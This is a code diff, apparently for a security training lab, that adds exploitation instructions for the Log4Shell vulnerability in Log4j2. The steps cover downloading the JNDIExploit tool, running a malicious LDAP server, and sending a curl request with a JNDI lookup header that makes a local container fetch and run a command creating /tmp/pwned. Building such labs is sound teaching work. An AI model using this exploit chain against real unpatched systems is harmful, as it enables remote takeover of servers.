@@ -84,7 +84,10 @@ def CreateDefault():
                    'This vulnerability enables a remote attacker to take control of a device on the internet if the device is running certain unpatched versions of Log4j2.\n'
                    'In December 2021, Apache had to release up to 4 corrective patches to fully close the breach. It is believed that malicious actors likely knew about the vulnerability'
                    ' and exploited it before experts did, hence why it is considered zero-day.')
-    instructions = ('You need to do this and that, blablabla.')
+    instructions = ('1. Download the JNDIExploit from that link -> https://tinyurl.com/yp2n78js then extract it in a dedicated folder.\n'
+                    '2. Launch a malicious LDAP server using the command \n"java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888\"\n'
+                    "3. Trigger the exploit using the command: curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'\n"
+                    "4. Go to Containers, open the main container shell and check for the presence of the pwned file by doing ls /tmp")
     images = {}
     images['main'] = {}
     images['main']['name'] = base
